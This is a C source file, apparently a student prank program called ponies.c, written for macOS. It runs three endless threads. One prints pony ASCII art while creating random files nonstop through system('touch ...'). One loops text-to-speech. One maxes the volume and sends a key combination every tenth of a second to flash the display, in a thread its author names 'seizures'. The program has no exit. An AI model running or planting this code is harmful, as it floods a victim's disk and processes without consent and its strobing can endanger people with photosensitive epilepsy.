/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ponies.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jaleman <jaleman@student.42.us.org>        +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/11 17:46:27 by jaleman           #+#    #+#             */
/*   Updated: 2017/03/11 17:46:28 by jaleman          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define SECONDS(s)	(s * 1000000)

/*
** Used to be a brony, but well... :/
*/

static void			mlp_ascii_art(void)
{
	printf("            ▓▓▓▓▓░▒▒▒▒▒▌▒▌▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░▓▓▓▓\n");
	printf("            ▓▓▓▓░░░▒▒▒▌▒▌▒▒▒▒▒▄▒▓▓▓▓  ▓▓▓▓▓░▒▒▒▒▒▓▓██▒░░▒▒▓▓▓\n");
	printf("            ▓▓▓░▐▌░▒░░░░░░▒▒▒▐▒▒▒▒▓▓  ▓▓▓▓░░░▒▒▒▒▒▓▓██░▒▒▒▒▓▓\n");
	printf("            ▓▓▒░░▌░░░░░░░░░░▐▒▒▒▒▒▒▓  ▓▓▓░▐▌░░▒▒▒▒▒▓▓██▒▒▒▒▒▓\n");
	printf("            ▓▒▒▒░░░░░░░░░░░░░▒▒▀▀▌▒▒  ▓▓▓░░▌░▒▒▒▒▒▓▓██▒▒▒▒▓▒▓\n");
	printf("            ▓▒▒░░░░░░▀▀███░░░░▀▒▒▒▌▒  ▓▓▓▒░░░░░░▀███░░░░▓▓▓▓▓\n");
	printf("            ▒▒▌░░░░░▌▄████▌░░░▒▒▒▐▒▒  ▓▓▒▒░░░░▌▄████▌░░░▓▓▓▓▓\n");
	printf("            ▒▐▒▒░░░░███▄█▌░░░▒▒▒▐▒▒▒  ▓▓▒▒░░░░███▄█▌░░░▓▓▓▓▓▓\n");
	printf("            ▒▒▐▒▒░░░░▀▀▀▀░░░░▒▒▒▐▒▒▓  ▓▓▒▒░░░░░▀▀▀▀░░░░▓▓▓▓▓▓\n");
	printf("            ▒▒▒▐▒▒░░░░░░░░░░░░▒▐▒▒▓▓  ▓▒▒▒▒░░░░░░░░░░░░░▓▓▓▓▓\n");
	printf("            ▒▒▒▒▐▒▒░░░░░░░▐▄░▒▐▒▓▓▓▓  ▓▒▒▒▒▒▒▒░░░░░░▐▄░▓▓▓▓▓▓\n");
	printf("            ▓▒▒▒▒▌▒▒░▓▓▓▓▒▒▒▒▀▒▓▓▓▓▓  ▓▒▒▒▒▒▒░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n");
	putchar('\n');
	printf("            ▓▓▓▓▓░▓▓▓▓▒▒▒▒██████▓▓▓▓  ▓▓▓▓▓░▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓\n");
	printf("            ▓▓▓▓░░░▓▓▓▓▒▒▒▒▒█████▓▓▓  ▓▓▓▓░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓\n");
	printf("            ▓▓▓░▐▌░░▓▓▓▓▒▒▒▒▒▒███▓▓▓  ▓▓▓░▐▌░▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓\n");
	printf("            ▓▓▒░░▌░░░░▓▓▓▓▒▒▒▒▒█▓▓▓▓  ▓▓▒░░▌░░░░░▒▒▒▒▒▒▒▒▓▓▓▓\n");
	printf("            ▓▒▓░░░░░░░░░▓▓▓▒▒▒▒▒█▓▓▓  ▓▓▒▒░░░░░░░░▒▒▒▒▒▒▒▒▓▓▓\n");
	printf("            ▓▒▓▓░░░░░▀▀███▓░▒▒▒▒▒▓▓▓  ▓▓▒░░░░░░▀▀███▒▒▒▒▒▒▒▒▓\n");
	printf("            ▒▒▒▓▓░░░▌▄████▌░░▒▒▒▓▓▓▓  ▓▓▒░░░░░▌▄████▌░░▒▒▒▒▓▓\n");
	printf("            ▒▒▒▓▓▓░░███▄█▌░░░▓▓▒▒▓▓▓  ▓▓▒▒░░░░███▄█▌░░░▓▓▓▓▓▓\n");
	printf("            ▒▒▒▒▓▓▓░░▀▀▀▀░░░░▓▓▓▒▓▓▓  ▓▓▒▒▒░░.’.░▀▀▀▀░░░░▓▓▓▓\n");
	printf("            ▒▒▒▒▒▓▓▓░░░░░░░░░░▓▓▓▓▓▓  ▓▓▒▒▒▒░░░░░░░░░░░░▓▓▓▓▓\n");
	printf("            ▓▒▒▒▒▒▓░░░░░░░▐▄░▓▓▓▓▓▓▓  ▓▒▒▒▒▒▒░░░░░░▐▄░░▓▓▓▓▓▓\n");
	printf("            ▓█▒▒▒▒▒░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▒▒▒▒▒▒▒░▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n\n");
}

/*
** Release the ponies.
*/

static void			*release_ponies(void *ptr)
{
	char	command[256];
	char	*ponies[6] = {"rainbowdash", "fluttershy", "rarity", \
							"twilight", "applejack", "pinkiepie"};
	while (!ptr)
	{
		mlp_ascii_art();
		usleep(SECONDS(0.1));
		snprintf(command, sizeof(command), "touch %s$RANDOM.gg &", ponies[rand() % 5]);
		system(command);
	}
	return (NULL);
}

/*
** RIP song
*/

static void			*gg_eazy(void *ptr)
{
	while (!ptr)
	{
		system("say -v Bad \
		'la la la la la la la la la la la la la la la la la la la la la la' &");
		usleep(SECONDS(12.25));
	}
	return (NULL);
}

/*
** PARTY HARD!!!
*/

static void			*seizures(void *ptr)
{
	while (!ptr)
	{
		system("osascript \
		-e 'set Volume 10' \
		-e 'tell application \"System Events\"' \
		-e 'key code 28 using {control down, option down, command down}' \
		-e 'end tell' &");
		usleep(SECONDS(0.1));
	}
	return (NULL);
}

/*
** Threads and run three (3) functions at the same time. :)
*/

int					main(void)
{
	pthread_t		thread_gg;
	pthread_t		thread_szs;
	pthread_t		thread_mlp;

	pthread_create(&thread_gg, NULL, gg_eazy, NULL);
	pthread_create(&thread_szs, NULL, seizures, NULL);
	pthread_create(&thread_mlp, NULL, release_ponies, NULL);
	pthread_join(thread_gg, NULL);
	pthread_join(thread_szs, NULL);
	pthread_join(thread_mlp, NULL);
	return (0);
}
